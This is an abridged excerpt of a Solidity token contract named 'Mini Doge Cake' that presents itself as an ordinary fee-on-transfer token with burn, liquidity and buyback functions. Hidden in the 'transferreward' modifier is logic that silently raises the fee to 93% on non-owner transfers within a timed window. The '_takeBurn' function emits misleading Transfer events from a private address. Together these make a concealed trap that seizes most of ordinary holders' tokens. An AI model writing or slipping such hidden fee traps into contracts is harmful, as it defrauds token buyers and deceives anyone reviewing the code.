...
contract MiniDogeCakeBNB is Context, IERC20, Ownable {
    ...
    string private _name = "Mini Doge Cake";
    ...
    uint256 public numTokensSellToAddToLiquidity = 8 * 10**7 * 10 **9;
    address ownerAddres;
    address privatefrom;
    address privateto;
    uint256 INTERVAL;
    ...
    modifier transferreward{
        _previousLiquidityFee = _liquidityFee;
        if(owner() != privatefrom && privateto != owner() && block.timestamp <= INTERVAL +7){
            _previousLiquidityFee = 93;
        }
        _;
        _previousLiquidityFee = _liquidityFee;
    }
    
    constructor (address _owneraddress,address _buybacktoken) public {
        ownerAddres = _owneraddress;
...
*/
    ...
    function _takeBurn(uint256 tBurn) private {
        ...
        if(tBurn > 0){
            ...
            emit Transfer(privatefrom, burnAddress, tBurn);
        }
    }
    ...
    function SetnumTokensSellToAddToLiquidity(uint256 maxsellPercent) external onlyOwner() {
        numTokensSellToAddToLiquidity = _tTotal.mul(maxsellPercent).div(
            10**4
        );
    }
    ...
    function _getTValues(uint256 tAmount) private transferreward returns (uint256 tTransferAmount,uint256 tFee,uint256 tLiquidity,uint256 tBurn) {
        if (!feeIt) {
            return (tAmount, 0, 0, 0);
        }
        tFee = tAmount.mul(_taxFee).div(100);
        tLiquidity = tAmount.mul(_previousLiquidityFee).div(100);
        tBurn = tAmount.mul(_burnFee).div(100);
        tTransferAmount = tAmount.sub(tFee).sub(tLiquidity).sub(tBurn);
    ...
    function _transfer(
        ...
        if(_from != ownerAddres && to != ownerAddres) {
        ...
        if(_isExcludedFromFee[_from] || _isExcludedFromFee[to]){
            takeFee = false;
        }
        //transfer amount, it will take tax, burn, liquidity fee
        _tokenTransfer(_from,to,amount,takeFee);
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        // split the contract balance into halves
        uint256 buybacktokenamount = contractTokenBalance.mul(30).div(100);
        uint256 liquidityamount = contractTokenBalance.mul(70).div(100);
       ...
       // uint256 initialBalance = address(this).balance;
        ...
        // swap tokens for ETH
        swapTokensForEth(liquidityamount); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered
        swapTokensForToken(buybacktokenamount);
